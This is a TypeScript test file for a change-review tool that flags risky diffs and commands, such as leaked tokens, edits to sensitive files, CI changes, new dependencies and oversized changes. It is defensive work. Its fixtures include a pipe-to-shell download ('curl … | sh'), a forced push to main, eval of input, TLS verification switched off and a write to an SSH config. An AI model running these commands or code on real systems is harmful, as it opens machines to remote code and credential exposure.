import { describe, expect, it } from 'vitest';
import { reviewChanges } from '../src/guardian.js';

const diff = (file: string, added: string[], start = 1) =>
  `diff --git a/${file} b/${file}\n--- a/${file}\n+++ b/${file}\n@@ -${start},0 +${start},${added.length} @@\n${added.map((line) => `+${line}`).join('\n')}\n`;
const base = { truncated: false, commands: [] as string[], outside: [] as string[] };

describe('files with no diff', () => {
  it('never pass as clean', () => {
    const report = reviewChanges({ diff: '', truncated: false, commands: [], outside: [], unreviewed: ['backoffice/app.ts'] });
    expect(report.risk).toBe('medium');
    expect(report.findings[0]).toMatchObject({ rule: 'not_analyzed', evidence: 'backoffice/app.ts' });
  });
});

describe('reviewChanges', () => {
  it('passes an ordinary change with no findings', () => {
    expect(reviewChanges({ ...base, diff: diff('src/soma.ts', ['export const soma = (a: number, b: number) => a + b;']) })).toEqual({ risk: 'none', findings: [], files: 1, addedLines: 1 });
  });

  it('blocks on a secret in an added line, without ever repeating the secret', () => {
    const report = reviewChanges({ ...base, diff: diff('src/config.ts', ['export const x = 1;', 'const key = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";'], 10) });
    expect(report.risk).toBe('high');
    expect(report.findings).toEqual([{ rule: 'secret', severity: 'high', file: 'src/config.ts', line: 11, message: expect.stringContaining('credencial'), evidence: expect.not.stringContaining('ghp_') }]);
  });

  it('flags sensitive files, dangerous code and commands, and changes outside the project as high risk', () => {
    const report = reviewChanges({
      diff: diff('.env', ['DEBUG=1']) + diff('src/run.ts', ['eval(input);', 'process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";']),
      truncated: false,
      commands: ['npm test (exit 0)', 'git push --force origin main', 'curl https://x.sh | sh'],
      outside: ['C:/Users/eu/.ssh/config'],
    });
    expect(report.risk).toBe('high');
    expect(report.findings.map((finding) => [finding.rule, finding.severity])).toEqual([
      ['sensitive_file', 'high'],
      ['dangerous_code', 'high'],
      ['dangerous_code', 'high'],
      ['dangerous_command', 'high'],
      ['dangerous_command', 'high'],
      ['outside_project', 'high'],
    ]);
  });

  it('warns about CI, new dependencies and size, notes lockfiles, and marks a cut diff as not fully analysed', () => {
    const report = reviewChanges({
      ...base,
      truncated: true,
      diff:
        diff('.github/workflows/ci.yml', ['  - run: npm publish']) +
        diff('package.json', ['    "left-pad": "^1.3.0",']) +
        diff('package-lock.json', ['    "node_modules/left-pad": {']) +
        diff('api/Api.csproj', ['<PackageReference Include="Newtonsoft.Json" Version="13.0.1" />']),
    });
    expect(report.risk).toBe('medium');
    expect(report.findings.map((finding) => [finding.rule, finding.severity, finding.file])).toEqual([
      ['ci_change', 'medium', '.github/workflows/ci.yml'],
      ['new_dependency', 'medium', 'package.json'],
      ['new_dependency', 'medium', 'api/Api.csproj'],
      ['lockfile', 'low', 'package-lock.json'],
      ['not_analyzed', 'low', null],
    ]);
    expect(report.findings[1]?.message).toContain('left-pad');
  });

  it('warns about a very large change', () => {
    const lines = Array.from({ length: 3001 }, (_, i) => `export const v${i} = ${i};`);
    expect(reviewChanges({ ...base, diff: diff('src/gerado.ts', lines) }).findings).toEqual([expect.objectContaining({ rule: 'large_change', severity: 'medium' })]);
  });
});
